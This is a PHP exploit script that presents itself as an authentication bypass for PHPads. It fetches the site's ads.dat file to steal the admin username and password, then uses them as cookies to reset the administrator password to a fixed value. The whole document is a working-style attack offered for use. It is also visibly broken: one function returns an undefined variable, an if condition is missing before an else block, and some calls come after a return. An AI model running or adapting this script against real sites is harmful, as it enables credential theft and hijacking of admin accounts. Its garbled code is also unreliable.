PHPads Authentication Bypass / Administrator Password Change Exploit
<form method="POST">
Target  : <br><input type="text" name="target" value="<? if($_POST[&#039;target&#039;]) {echo $_POST[&#039;target&#039;]; }else{echo &#039;http://localhost:4545/phpads&#039;;} ?>" size="70" /><br /><input type="submit" name="submit" />
</form>
<?php
function catchya($string, $start, $end)
{
    return $matches[1];
}
 
function login($target)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$target."/ads.dat");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
    $result = curl_exec($ch);
    $username = catchya($result, "user=", "\n");
    $password = catchya($result, "pass=", "\n");
    return array($username,$password);
    curl_close($ch);
}
 
function adminchange($target, $username, $password)
{
    $post = array(&#039;save&#039; => &#039;1&#039;,
    &#039;newlogin&#039; => $username,
    &#039;newpass&#039; => "htlover");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$target);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_COOKIE, &#039;user=&#039;.$username.&#039;; pass=&#039;.$password);
    curl_setopt($ch,CURLOPT_POST,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
    $result = curl_exec($ch);
    {
        return "<br><br><font color=green>Success !! Password changed </font><br>username: ".$username." | password: htlover";
    }else{
        return "Something wrong <br>";
    }
    curl_close($ch);
}
 
if (isset($_POST[&#039;submit&#039;]))
{
    $target = $_POST[&#039;target&#039;];
    //login($target, $username, $userid);
    $logins = login($target);
    echo "USERNAME :" . $logins[0]; // username
    echo "<br>PASSWORD :" . $logins[1]; // password
    echo adminchange($target.&#039;/admin.php?action=config&#039;, $logins[0], $logins[1]);
}
 
 
 
 
?>

